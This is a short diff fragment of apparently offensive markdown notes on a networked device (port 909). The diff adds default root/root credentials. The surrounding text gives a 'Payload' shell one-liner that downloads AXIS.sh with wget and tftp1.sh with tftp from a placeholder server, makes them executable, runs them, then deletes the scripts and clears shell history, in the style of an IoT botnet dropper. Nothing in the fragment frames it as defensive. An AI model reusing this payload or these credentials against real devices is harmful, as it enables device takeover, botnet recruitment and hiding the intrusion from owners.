@@ -12,6 +12,10 @@
   * PORT: 909
   * TYPE: RAW
   
+* Password (default)
+  * username: root
+  * password: root
+  
 ### Payload
 * Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://(server-ip)/AXIS.sh; chmod 777 *; sh AXIS.sh; tftp -g (server-ip) -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c"
 
